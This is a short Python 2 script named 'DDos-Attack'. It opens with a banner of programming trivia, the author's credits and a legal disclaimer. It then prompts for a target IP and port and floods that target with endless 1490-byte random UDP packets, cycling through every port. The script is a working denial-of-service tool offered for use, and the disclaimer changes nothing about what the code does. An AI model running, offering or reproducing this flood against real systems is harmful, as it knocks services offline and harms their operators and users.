import sys

import os

import time

import socket

import random

#Code

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

#Banner Start

print "what is Programming ?"

print "Computer programming is the process of performing a particular computation, usually by designing and building an executable computer program. Programming involves tasks such as analysis, generating algorithms, profiling algorithms' accuracy and resource consumption, and the implementation of algorithms."

print "How many programming languages are there in the world ?"

print "According to the Online Historical Encyclopaedia of Programming Languages, people have created about 8,945 coding languages. Today, various sources report anywhere from 250-2,500 Programming languages, although far fewer rank as top contenders in the commonly used group."

print "What is python ?"

print "Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically-typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming."

#Banner End

print "[+] Tool Name:DDos-Attack"

print "[+] Author:Yousuf Shafi'i Muhammad. Junior Programmer."

print "[+] Version:1.0"

print "[+] Team:Junior Programmers."

print "[+] Github: https://github.com/Yousuf9963/phone-num-info."

print "[+] Follow me on Github: https://github.com/Yousuf9963."

print "[-] Website: muhammadabdirahman.wixsite.com/yousuf9963blog."

print "[!] legal disclaimer: Usage of this Program for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program."

print "Motto: [+] I hope for you good future and i am willing that you will come high effort."

print     

ip = raw_input("[*]Enter Target IP: ")

port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)

print "[-------->           ] 45%"

time.sleep(3)

print "[------------>       ] 55%"

time.sleep(3)

print "[------------------->] 100%"

time.sleep(5)

sent = 0

while True:

     sock.sendto(bytes, (ip,port))

     sent = sent + 1

     port = port + 1

     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)

     if port == 65534:

       port = 1

#Credit - github.com/kinghacker0
